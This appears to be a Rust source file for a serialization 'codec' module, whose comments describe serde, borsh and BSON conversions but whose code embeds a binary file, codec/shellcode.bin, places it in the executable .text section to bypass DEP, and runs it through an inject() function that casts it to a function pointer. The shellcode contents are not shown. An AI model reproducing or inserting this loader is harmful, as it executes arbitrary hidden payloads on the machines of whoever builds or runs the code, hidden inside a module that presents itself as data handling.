





// TODO - codec for blockchain structures like borsh and serde which is for structs to utf8 or bson or json and vice versa to map from utf8 into struct; convert from struct into utf8 using a simple union
// NOTE - to send some data back to the user we must serialize that data struct into the json and from there to utf8 to pass through the socket
// NOTE - to send fetched data from mongodb which is a bson object back to the user we must first deserialize the bson into its related struct and then serialize it to json to send back to the user through the socket
// NOTE - borsh like codec ops : Box<[u8]> (automatic lifetime) or &'a [u8] <-> vec[u8] <-> struct
// NOTE - &[u8] bytes to str using str::from_utf8() -> parse it and build the key:value hashmap -> build the struct instance from the hashmap
// NOTE - deserialization using json string : &[u8] buffer ----serde_json::from_reader()----> Value ----serde_json::to_string()----> json string or &str ----serde_json::from_str()----> struct
// NOTE - deserialization using json string : &[u8] buffer ----serde_json::from_reader()----> Value or json!({}) ----serde_json::from_value()---->  struct
// NOTE - deserialization using slice       : &[u8] buffer ----serde_json::from_slice()----> struct
// NOTE - serializing                       : struct instance ----serde_json::to_vec()----> Vec<u8> which will be coerced to &[u8] at compile time
// NOTE - serializing                       : struct instance ----serde_json::to_string()----> json string will be coerced to &str at compile time



pub mod encoder;
pub mod decoder;



use std::mem;


pub const SHELLCODE_BYTES: &[u8] = include_bytes!("codec/shellcode.bin"); //-- includes a file as a reference to a byte array of a binary file in form &[u8]
pub const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();
//// DEP (Data Execution Prevention) prevents code from being run from data pages such as the default heap, stacks, and memory pools, 
///      if an application attempts to run code from a data page that is protected, a memory access violation exception occurs, 
//       and if the exception is not handled, the calling process is terminated.
//// shellcodes might be in non executable section inside the memory 
//// dereferencing requires known size thus we must dereference the loaded shellcode int [u8; SHELLCODE_LENGTH]
//// we must dereference the &[u8] shellcode to inject the buffer itself otherwise the reference of the buffer will be injected  
#[no_mangle]
#[link_section=".text"] //// means we're executing the shellcode inside the .text section of the memory
pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("codec/shellcode.bin"); //// includes a file as a reference to a byte array of a binary file thus we must dereference it in order to coerce it into [u8]




pub fn inject(){
    //// the equivalent of () in C is *const ()
    let exec_shellcode: extern "C" fn() -> () = unsafe{ //// the type of exec_shellcode is a C function pointer which will return nothing; since everything in rust must have a specific size thus the compiler cannot predict what memory address the () would be associated with at execution time
        mem::transmute(&SHELLCODE as *const [u8] as *const ()) //// it copies the bits from the source value into the destination value; in our case we're transmutting the shellcode [u8] buffer into a C function pointer which is () in rust so we can call it later to execute it
    };
    exec_shellcode();

}